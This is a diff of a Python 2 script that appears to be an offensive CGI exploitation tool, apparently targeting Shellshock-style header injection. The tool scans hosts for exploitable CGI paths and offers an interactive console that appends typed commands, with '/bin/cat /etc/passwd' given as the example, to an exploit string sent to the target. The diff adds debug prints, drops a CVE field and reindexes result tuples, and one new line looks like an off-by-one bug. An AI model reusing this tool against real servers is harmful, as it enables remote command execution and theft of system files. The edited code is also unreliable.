@@ -136,6 +136,8 @@ def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
     Return a list of cgi which exist and might be vulnerable
     """
 
+    print host_target_list
+
     # List of potentially epxloitable URLs 
     exploit_targets = []
     cgi_num = len(cgi_list)
@@ -178,13 +180,14 @@ def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
         # Wait for all the threads to finish before moving on    
         for thread in threads:
             thread.join()
-    
+   
         # Pop any results from the Queue and add them to the list of potentially 
         # exploitable urls (exploit_targets) before returning that list
         while not q.empty():
             exploit_targets.append(q.get())
     
     if verbose: print "[+] Finished host scan"
+    print exploit_targets
     return exploit_targets
 
 def do_check_cgi(req, q, verbose):
@@ -282,7 +285,6 @@ def ask_for_console(proxy, successful_targets, verbose):
 
     # Initialise to non zero to enter while loop
     user_input = 1
-    
     while user_input is not 0:
         result = ""
         if len(successful_targets) > 1:
@@ -290,7 +292,7 @@ def ask_for_console(proxy, successful_targets, verbose):
         else:
             print "[+] The following URL appears to be exploitable:"
         for x in range(len(successful_targets)):
-            print "  [%i] %s" % (x+1, successful_targets[x])
+            print "  [%i] %s" % (x+1, successful_targets[x+1][0])
         print "[+] Would you like to exploit further?"
         user_input = raw_input("[>] Enter an URL number or 0 to exit: ")
         sys.stdout.flush()
@@ -305,9 +307,8 @@ def ask_for_console(proxy, successful_targets, verbose):
         elif not user_input:
             continue
         target = successful_targets[user_input][0]
-	cve_reference = successful_targets[user_input][1]
-        header = successful_targets[user_input][2]
-	exploit = successful_targets[user_input][3]
+        header = successful_targets[user_input][1]
+	exploit = successful_targets[user_input][2]
         print "[+] Entering interactive mode for %s" % target
         print "[+] Enter commands (e.g. /bin/cat /etc/passwd) or 'quit'"
 
@@ -323,7 +324,7 @@ def ask_for_console(proxy, successful_targets, verbose):
                 sys.stdout.flush()
                 break
             if command:
-                attack = successful_targets[user_input][3] + command
+                attack = successful_targets[user_input][2] + command
                 result = do_attack(proxy, target, header, attack, verbose)
             else:
                 result = ""
